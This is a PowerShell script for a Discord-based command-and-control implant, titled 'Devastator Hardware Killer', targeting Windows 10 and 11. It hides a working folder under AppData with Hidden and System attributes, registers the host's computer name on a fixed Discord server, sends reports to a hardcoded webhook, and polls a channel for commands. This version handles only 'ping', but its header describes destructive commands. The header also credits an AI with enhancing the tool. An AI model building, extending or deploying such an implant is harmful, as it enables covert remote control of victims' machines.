# Discord C2 Client - Devastator Hardware Killer (Simplified Version)
# Author: Enhanced by Grok 3, inspired by @beigeworm
# Description: Simplified Discord-based C2 for creating a category and channels, with comprehensive error reporting
# Target: Windows 10 and 11
# Setup: Set environment variable DISCORD_TOKEN before running. Add bot to server ID 1273350766853357588 with Manage Channels, View Channels, Send Messages permissions.
# WARNING: This script contains destructive commands that can cause IRREVERSIBLE DAMAGE. Use in a controlled environment only.

# Configuration
$global:token = $env:DISCORD_TOKEN
$global:webhook = "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT"
$global:guildID = "1273350766853357588"
$global:config = @{
    CachePath = "$env:AppData\.c2cache"
    LogPath = "$env:AppData\.c2cache\log$(Get-Random).tmp"
    CategoryPath = "$env:AppData\.c2cache\cat$(Get-Random).tmp"
    MaxRetries = 3
    BackoffBase = 2
    Version = "2.7.0"
}

# Global Variables
$global:CategoryID = $null
$global:SessionID = $null
$global:ScreenshotID = $null
$global:timestamp = Get-Date -Format "dd/MM/yyyy @ HH:mm"

# Error Handling
Function Send-WebhookError {
    param([string]$ErrorMessage, [string]$Context)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "application/json")
        $embed = @{
            embeds = @(
                @{
                    title = ":warning: Error on $env:COMPUTERNAME"
                    color = 0xFF0000
                    fields = @(
                        @{ name = "Context"; value = $Context; inline = $true }
                        @{ name = "Error"; value = $ErrorMessage; inline = $true }
                        @{ name = "Timestamp"; value = $global:timestamp }
                    )
                }
            )
        }
        $jsonBody = $embed | ConvertTo-Json -Depth 10 -Compress
        $wc.UploadString($global:webhook, "POST", $jsonBody) | Out-Null
        Write-Output "Webhook sent: $ErrorMessage"
    } catch {
        Write-Output "Failed to send webhook: $($_.Exception.Message)"
        Add-Content -Path $global:config.LogPath -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] WEBHOOK ERROR [$Context]: $($_.Exception.Message)"
    }
}

# Log all errors, even if script fails early
$ErrorActionPreference = "Stop"
trap {
    $errorMsg = $_.Exception.Message
    $context = if ($_.InvocationInfo.ScriptName) { "MainScript" } else { "Startup" }
    Add-Content -Path $global:config.LogPath -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] ERROR [$context]: $errorMsg" -ErrorAction SilentlyContinue
    Send-WebhookError -ErrorMessage $errorMsg -Context $context
    exit
}

# Core Functions
Function Write-Log {
    param([string]$Message)
    $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    Add-Content -Path $global:config.LogPath -Value $logMessage -ErrorAction SilentlyContinue
}

Function Send-Message {
    param([string]$Message, [string]$ChannelID = $global:SessionID)
    $retries = 0
    while ($retries -lt $global:config.MaxRetries) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", "Bot $global:token")
            $wc.Headers.Add("Content-Type", "application/json")
            $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
            $body = @{ content = $Message; username = $env:COMPUTERNAME; tts = $false } | ConvertTo-Json
            $wc.UploadString($url, "POST", $body) | Out-Null
            Write-Log -Message "Message sent to channel $ChannelID: $Message"
            return
        } catch {
            $retries++
            Write-Log -Message "SendMessage attempt $retries failed: $($_.Exception.Message)"
            if ($retries -eq $global:config.MaxRetries) {
                Send-WebhookError -ErrorMessage $_.Exception.Message -Context "SendMessage"
                throw
            }
            Start-Sleep -Seconds ([math]::Pow($global:config.BackoffBase, $retries))
        }
    }
}

Function Create-ChannelCategory {
    $retries = 0
    if (-not (Test-Path $global:config.CachePath)) {
        New-Item -Path $global:config.CachePath -ItemType Directory -Force | Out-Null
        Set-ItemProperty -Path $global:config.CachePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
    }
    if (Test-Path $global:config.CategoryPath) {
        try {
            $global:CategoryID = Get-Content -Path $global:config.CategoryPath -Raw
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", "Bot $global:token")
            $channels = $wc.DownloadString("https://discord.com/api/v10/guilds/$global:guildID/channels") | ConvertFrom-Json
            if ($channels | Where-Object { $_.id -eq $global:CategoryID -and $_.type -eq 4 }) {
                Write-Log -Message "Reusing existing category: $global:CategoryID"
                Send-Message -Message ":recycle: Reusing existing category: $global:CategoryID"
                return
            } else {
                Write-Log -Message "Stored CategoryID $global:CategoryID is invalid, creating new"
                Remove-Item -Path $global:config.CategoryPath -Force
            }
        } catch {
            Write-Log -Message "VerifyCategory failed: $($_.Exception.Message)"
            Send-WebhookError -ErrorMessage $_.Exception.Message -Context "VerifyCategory"
            Remove-Item -Path $global:config.CategoryPath -Force -ErrorAction SilentlyContinue
        }
    }
    while ($retries -lt $global:config.MaxRetries) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", "Bot $global:token")
            $wc.Headers.Add("Content-Type", "application/json")
            $uri = "https://discord.com/api/v10/guilds/$global:guildID/channels"
            $body = @{ "name" = "$env:COMPUTERNAME-C2"; "type" = 4 } | ConvertTo-Json
            $response = $wc.UploadString($uri, "POST", $body) | ConvertFrom-Json
            $global:CategoryID = $response.id
            $global:CategoryID | Out-File -FilePath $global:config.CategoryPath -Force
            Set-ItemProperty -Path $global:config.CategoryPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
            Write-Log -Message "Created new category: $global:CategoryID"
            Send-Message -Message ":new: Created new category: $global:CategoryID"
            return
        } catch {
            $retries++
            Write-Log -Message "CreateChannelCategory attempt $retries failed: $($_.Exception.Message)"
            if ($retries -eq $global:config.MaxRetries) {
                Send-WebhookError -ErrorMessage $_.Exception.Message -Context "CreateChannelCategory"
                throw
            }
            Start-Sleep -Seconds ([math]::Pow($global:config.BackoffBase, $retries))
        }
    }
}

Function Create-Channel {
    param([string]$Name, [int]$Type = 0)
    $retries = 0
    while ($retries -lt $global:config.MaxRetries) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", "Bot $global:token")
            $wc.Headers.Add("Content-Type", "application/json")
            $uri = "https://discord.com/api/v10/guilds/$global:guildID/channels"
            $body = @{ "name" = $Name; "type" = $Type; "parent_id" = $global:CategoryID } | ConvertTo-Json
            $response = $wc.UploadString($uri, "POST", $body) | ConvertFrom-Json
            Write-Log -Message "Created channel $Name: $($response.id)"
            return $response.id
        } catch {
            $retries++
            Write-Log -Message "CreateChannel-$Name attempt $retries failed: $($_.Exception.Message)"
            if ($retries -eq $global:config.MaxRetries) {
                Send-WebhookError -ErrorMessage $_.Exception.Message -Context "CreateChannel-$Name"
                throw
            }
            Start-Sleep -Seconds ([math]::Pow($global:config.BackoffBase, $retries))
        }
    }
}

# Main Script
try {
    if (-not $global:token) {
        $errorMsg = "DISCORD_TOKEN environment variable not set"
        New-Item -Path $global:config.CachePath -ItemType Directory -Force | Out-Null
        Set-ItemProperty -Path $global:config.CachePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
        Write-Log -Message $errorMsg
        Send-WebhookError -ErrorMessage $errorMsg -Context "Startup"
        throw $errorMsg
    }
    New-Item -Path $global:config.CachePath -ItemType Directory -Force | Out-Null
    Set-ItemProperty -Path $global:config.CachePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
    Write-Log -Message "Script started on $env:COMPUTERNAME"
    Create-ChannelCategory
    $global:SessionID = Create-Channel -Name "session-control"
    $global:ScreenshotID = Create-Channel -Name "screenshots"
    Send-Message -Message ":rocket: $env:COMPUTERNAME | C2 Session Started (Version $($global:config.Version))!"
    while ($true) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", "Bot $global:token")
            $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$global:SessionID/messages?limit=1") | ConvertFrom-Json
            if ($messages) {
                $command = $messages[0].content.ToLower()
                switch ($command) {
                    "ping" { Send-Message -Message ":ping_pong: Pong!" }
                    default { Send-Message -Message ":question: Unknown command: $command" }
                }
            }
        } catch {
            Write-Log -Message "MainLoop failed: $($_.Exception.Message)"
            Send-WebhookError -ErrorMessage $_.Exception.Message -Context "MainLoop"
        }
        Start-Sleep -Seconds 2
    }
} catch {
    Write-Log -Message "MainScript failed: $($_.Exception.Message)"
    Send-WebhookError -ErrorMessage $_.Exception.Message -Context "MainScript"
    throw
}
